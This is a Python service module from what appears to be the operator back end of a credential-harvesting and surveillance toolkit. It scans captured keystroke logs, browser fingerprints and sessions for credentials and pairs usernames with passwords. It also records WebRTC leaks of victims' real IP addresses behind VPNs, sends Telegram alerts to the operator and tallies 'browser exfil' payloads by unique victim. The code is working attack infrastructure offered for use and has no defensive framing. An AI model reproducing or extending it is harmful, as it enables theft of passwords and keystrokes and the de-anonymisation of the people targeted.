"""Intel service (P4.4) — profiles, credentials, webrtc, browser exfil.

Extracted verbatim from ``app/blueprints/credentials.py``,
``app/blueprints/intel.py`` and ``app/blueprints/browser_exfil.py``
route bodies.  Blueprints stay thin HTTP adapters; scanning (frozen
``credential_parser`` module), persistence, file listing and
notification fan-out live here.

No behavior change intended — ``tests/char`` freezes response shapes.
"""
from __future__ import annotations

import json
import os
from collections import defaultdict
from datetime import datetime

import database as db

from telegram_bot import telegram_bot

from app.state import BASE_DIR, STORE, track_event
from credential_parser import (
    get_credential_stats,
    pair_credentials,
    scan_fingerprints,
    scan_keystroke_files,
    scan_sessions,
)


# -- Credentials ---------------------------------------------------------------

def run_credential_scan() -> dict:
    """Scan every captured-data source, persist findings + pairs."""
    keystroke_creds = scan_keystroke_files()
    fingerprint_creds = scan_fingerprints()
    session_creds = scan_sessions()

    all_creds = keystroke_creds + fingerprint_creds + session_creds

    # Save to database
    saved = 0
    for cred in all_creds:
        result = db.save_credential(
            cred_type=cred['type'],
            value=cred['value'],
            source=cred.get('source', 'scan'),
            source_file=cred.get('file', ''),
            url=cred.get('url', ''),
            confidence=cred.get('confidence', 50),
        )
        if result:
            saved += 1

    # Also save pairs
    pairs = pair_credentials()
    for pair in pairs:
        db.save_credential(
            cred_type='credential_pair',
            value=f"{pair['username']}:{pair['password']}",
            source=pair.get('source', 'pairing'),
            source_file=pair.get('file', ''),
            url=pair.get('url', ''),
            confidence=80,
            paired_username=pair['username'],
            paired_password=pair['password'],
        )

    return {
        'status': 'scan_complete',
        'found': len(all_creds),
        'saved': saved,
        'pairs': len(pairs),
        'breakdown': get_credential_stats()
    }


def list_credentials(cred_type=None) -> list:
    return db.get_credentials(cred_type=cred_type)


def credential_pairs() -> list:
    return db.get_credential_pairs()


def credential_stats() -> dict:
    all_creds = db.get_credentials()
    stats = {}
    for cred in all_creds:
        t = cred['cred_type']
        stats[t] = stats.get(t, 0) + 1
    return stats


def delete_credential(cred_id: int) -> None:
    db.delete_credential(cred_id)


# -- Fingerprints / keystroke listings (file-driven) -----------------------------

def list_fingerprints() -> list:
    """List all captured fingerprints with details."""
    fp_dir = os.path.join(BASE_DIR, 'fingerprints')
    os.makedirs(fp_dir, exist_ok=True)

    fingerprints = []
    for f in sorted(os.listdir(fp_dir), reverse=True):
        if f.endswith('.json'):
            filepath = os.path.join(fp_dir, f)
            with open(filepath, 'r') as fh:
                data = json.load(fh)
                fingerprints.append({
                    'filename': f,
                    'hash': data.get('hash', 'unknown'),
                    'timestamp': os.path.getmtime(filepath),
                    'browser': data.get('basic', {}).get('userAgent', 'Unknown')[:80],
                    'screen': f"{data.get('basic', {}).get('screenWidth', '?')}x{data.get('basic', {}).get('screenHeight', '?')}",
                    'platform': data.get('basic', {}).get('platform', 'Unknown'),
                })
    return fingerprints


def list_keystrokes() -> list:
    """List all captured keystroke logs."""
    ks_dir = os.path.join(BASE_DIR, 'keystrokes')
    os.makedirs(ks_dir, exist_ok=True)

    keystroke_files = []
    for f in sorted(os.listdir(ks_dir), reverse=True):
        if f.endswith('.json'):
            filepath = os.path.join(ks_dir, f)
            with open(filepath, 'r') as fh:
                data = json.load(fh)
                logs = data.get('logs', [])
                keystroke_files.append({
                    'filename': f,
                    'timestamp': os.path.getmtime(filepath),
                    'count': len(logs),
                    'passwords': sum(1 for l in logs if l.get('target', {}).get('type') == 'password'),
                    'url': data.get('url', 'Unknown'),
                })
    return keystroke_files


def load_keystroke_file(filename: str):
    """Return the parsed keystroke file, or ``None`` when missing."""
    filepath = os.path.join(BASE_DIR, 'keystrokes', filename)
    if os.path.exists(filepath):
        with open(filepath, 'r') as f:
            return json.load(f)
    return None


# -- WebRTC -----------------------------------------------------------------------

def record_webrtc_leak(data: dict, remote_addr: str) -> dict:
    """Store one STUN leak, auto-update profile, track + alert on VPN."""
    leak = {
        'real_ip': data.get('real_ip', data.get('ip', '')),
        'visible_ip': remote_addr,
        'user_agent': data.get('user_agent', ''),
        'platform': data.get('platform', ''),
        'timestamp': datetime.now().isoformat(),
        'vpn_detected': data.get('real_ip', '') != remote_addr,
    }
    STORE.webrtc_leak_append(leak)  # trim-at-500 (legacy semantics)

    # Auto-update victim profile
    if leak['real_ip']:
        db.save_victim_profile(ip=leak['real_ip'], user_agent=leak.get('user_agent', ''))

    track_event('webrtc_leak', leak, remote_addr)

    # Telegram alert if VPN detected
    if leak['vpn_detected']:
        telegram_bot.alert_credential('webrtc_leak', f"Real: {leak['real_ip']} | Visible: {leak['visible_ip']}", 'WebRTC STUN')
    return leak


def recent_webrtc_leaks(limit: int = 100) -> list:
    """Newest ``limit`` leaks for the operator list endpoint."""
    return STORE.webrtc_leaks_get()[-limit:]


# -- Browser exfil -----------------------------------------------------------------

def save_browser_exfil(victim_ip: str, session_id: str, data_type: str,
                       exfil_data, metadata: dict):
    """Persist one exfil payload; returns the stored row id."""
    return db.save_browser_exfil(victim_ip, session_id, data_type,
                                 exfil_data, metadata)


def browser_exfil_stats() -> dict:
    all_data = db.get_browser_exfil()
    stats = defaultdict(int)
    ips = set()
    for d in all_data:
        stats[d.get('data_type', 'unknown')] += 1
        ips.add(d.get('victim_ip', ''))
    return {
        'total': len(all_data),
        'by_type': dict(stats),
        'unique_victims': len(ips),
    }


__all__ = [
    "run_credential_scan", "list_credentials", "credential_pairs",
    "credential_stats", "delete_credential",
    "list_fingerprints", "list_keystrokes", "load_keystroke_file",
    "record_webrtc_leak", "recent_webrtc_leaks",
    "save_browser_exfil", "browser_exfil_stats",
]

